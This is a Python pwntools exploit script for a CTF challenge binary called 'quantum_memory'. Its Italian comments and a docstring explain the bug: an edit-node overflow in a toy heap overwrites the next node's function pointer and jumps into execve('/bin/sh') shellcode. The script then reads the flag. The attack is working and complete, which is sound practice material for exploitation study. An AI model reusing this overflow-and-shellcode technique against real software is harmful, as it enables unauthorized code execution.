#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./quantum_memory_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
line = b">>> "
line_2 = b": "
pool_base = 0


def allocate(idx, name):
    info(f"allocating node {idx} -> {name}")
    io.sendlineafter(line, b"1")
    io.sendlineafter(line_2, str(idx).encode())
    io.sendlineafter(line_2, name.encode())

def edit(idx, data):
    info(f"editing node {idx}")
    io.sendlineafter(line, b"2")
    io.sendlineafter(line_2, str(idx).encode())
    io.sendlineafter(line_2, b"256")
    io.sendlineafter(line_2, data)

def get_leak():
    global pool_base
    io.sendlineafter(line, b"5")
    pool_base = int(io.recvline().split(b": ")[1], 16)
    success(f"pool @ {hex(pool_base)}")

def view_node(idx):
    io.sendlineafter(line, b"3")
    io.sendlineafter(line_2, str(idx).encode())

'''
Vuln:
The program implemented a toy heap inside the data segment, called "poll".
Each allocation (or malloc) in the pool was a node: 
A 256-byte region composed by 32 byte long name, 8 bytes occupied by
the print function pointer, and the content of the node for the remaining size. 

The stack was executable. 

The bug was in the edit node function, allowing to write 256 bytes as the
content, overflowing in the next node, letting overwrite that node’s print 
function pointer. 

Then redirected execution into the pool itself  
where was placed shellcode in the first node.

'''

victim = 1
attacker = 0
allocate(attacker, "/bin/sh\x00")
allocate(victim, "victim")
get_leak()

success(f"allocated attacker and victim.")
shell = asm(f"""
    {"nop;"*8}
    mov rdi, {pool_base};
    xor rsi, rsi;
    xor rdx, rdx;
    mov rax, 59;
    syscall;    
    """)
offset = 216-len(shell)

fake_chunk = flat(
    shell,
    {
    offset : [
        b"exploited".ljust(32, b'\x00'), 
        pool_base+0x30
    ]
    }
)

edit(attacker, fake_chunk)
success(f"poisoned the nodes.")

warning("Calling shell.")
view_node(victim)
io.sendline(b"cat flag.txt")
data = io.recvregex(rb'H7CTF\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
